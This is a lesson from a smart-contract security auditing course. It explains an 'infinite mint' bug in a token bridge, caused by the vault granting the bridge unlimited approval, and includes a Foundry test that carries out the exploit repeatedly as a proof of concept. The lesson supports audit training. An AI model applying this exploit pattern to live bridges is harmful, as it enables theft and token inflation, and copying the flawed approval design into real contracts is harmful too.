---
title: Exploit - Infinite Mint
---

_Follow along with the video lesson:_

---

### Exploit - Infinite Mint

That high we found was really interesting. Let's take a moment to redress how it came about.

```js
function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
    token.safeTransferFrom(from, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
    emit Deposit(from, l2Recipient, amount);
}
```

We saw that, because this function takes an `arbitrary from` address, it allows any user to transfer approved tokens from any other user.

Can you think of any other situations in which the Boss Bridge protocol is approving tokens?

```js
constructor(IERC20 _token) Ownable(msg.sender) {
    token = _token;
    vault = new L1Vault(token);
    // Allows the bridge to move tokens out of the vault to facilitate withdrawals
    vault.approveTo(address(this), type(uint256).max);
}
```

Oh my ... The L1Vault is approving the bridge! This may be another high!

If the vault is giving approvals to the bridge a user would theoretically be able to call `depositTokensToL2`, passing _the vault's_ address as the `from` parameter. This seems potentially very bad. Let's try writing a test for this.

Open up L1TokenBridge.sol and we can get started.

```js
function testCanTransferFromVaultToVault() {}
```

By calling `depositTokensToL2` _from_ the vault, we're essentially transferring the tokens _back_ to the vault, but we'll be emitting a `Deposit` event with the parameters:

- from = address(vault)
- l2Recipient = address(attacker)
- amount = token.balanceOf(address(vault))

An important thing to note is that because the tokens are never really leaving the vault (they're transferring from the vault to the vault), this means the attack could be made multiple times to repeatedly emit this event, effectively minting infinite tokens on the L2.

Let's show it in our test.

```js
function testCanTransferFromVaultToVault() public {
    address attacker = makeAddr("attacker");

    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Trigger the deposit event, self transfer tokens to the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), attacker, vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);

    // Test being able to repeat the exploit
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), attacker, vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
}
```

Our test shouldn't be too unfamiliar from most of the last one we wrote. We're declaring an attacker and using the [**Foundry Cheatcode `Deal`**](https://book.getfoundry.sh/cheatcodes/deal?highlight=deal#deal) to give `500 ether` worth of our `L1Token` to the `Vault`.

From here, we set our expectEmits to show that the deposit event emits the `vault` as a from address, with the `attacker` as the recipient on L2. Because no tokens are removed from the `vault`, we can even exploit this multiple times.

Let's run the test.

```bash
forge test --mt testCanTransferFromVaultToVault
```

![infinite-mint1](/security-section-7/22-infinite-mint/infinite-mint1.png)

Yikes.

We're going to skip doing the write up for this together, but if you're serious about putting these skills to work, I encourage you to write up the finding report for this `high severity` bug.
